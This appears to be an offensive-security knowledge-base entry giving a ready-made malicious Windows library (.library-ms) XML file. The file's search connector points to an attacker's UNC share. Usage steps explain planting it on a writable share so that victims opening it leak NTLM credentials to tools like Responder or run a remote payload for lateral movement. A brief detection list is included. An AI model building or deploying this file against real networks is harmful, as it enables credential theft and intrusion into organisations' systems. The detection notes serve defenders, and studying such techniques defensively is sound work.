---
type: code
language: xml
verified: true
tags:
  - windows-library
  - malicious-payload
  - scf-attack
platforms:
  - Windows
validated: true
---

# Malicious-Windows-Library-Description-XML

## Code

```xml
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo>
    <folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
        <url>\\workstation@8888\\folder</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>
```

## Description

This XML code defines a malicious Windows Library Description for a .library-ms file. It includes a search connector with a UNC path (\\workstation@8888\\folder) that, when the library is opened, causes Windows Explorer to authenticate to the remote server and fetch linked .scf or .url files, enabling code execution or hash capture. The fields like name, version, and iconReference make it appear as a legitimate library, while the simpleLocation URL triggers the attack.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| workstation | Attacker's server hostname or IP in UNC format | attacker-ip |
| 8888 | Port for the remote service (customize to 445 for SMB) | 445 |
| folder | Share or path containing the malicious .scf/.url | payloads |

## Usage

Save this XML as a .library-ms file using PowerShell or a text editor, then place it on a writable share. When a victim opens it in Explorer, it resolves the UNC, authenticates with their credentials, and executes the remote payload. Combine with tools like Responder for hash capture. Used in procedures targeting Active Directory shares for lateral movement.

## Detection

- Monitor for XML parsing in Explorer processes (ProcMon filters for .library-ms).
- Sysmon Event ID 3 for outbound SMB connections to unusual hosts/ports.
- File creation events for .library-ms with suspicious UNC paths in content.
- Network logs showing NTLM auth to internal/external servers from Explorer.

## Related

- [[procedures/SCF-and-URL-File-Attack-Against-Writable-Share-via-Windows-Library-Files]]
- [[powershell-create-library-file]]
